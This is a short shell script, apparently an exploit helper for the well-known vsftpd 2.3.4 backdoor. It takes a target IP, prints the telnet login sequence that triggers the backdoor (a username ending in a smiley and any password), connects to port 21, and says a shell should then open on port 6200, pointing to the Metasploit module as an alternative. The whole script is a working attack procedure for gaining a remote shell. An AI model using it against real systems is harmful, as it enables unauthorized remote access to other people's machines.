#! /bin/sh
if [ -z "$1" ]
      then
          echo "usage: vsftpd234OpenBackDoor.sh 'ip'"
          exit 1
fi

echo "You need to type 'user backdoored:)' \nthen 'pass invalid' \nthen 'control + ]' \nthen 'quit'"
telnet $1 21
echo "Now there should be a shell open on port 6200 for telnet.\nUse the vsftpdBackDoor in metasploit or login yourself through telnet.\n"
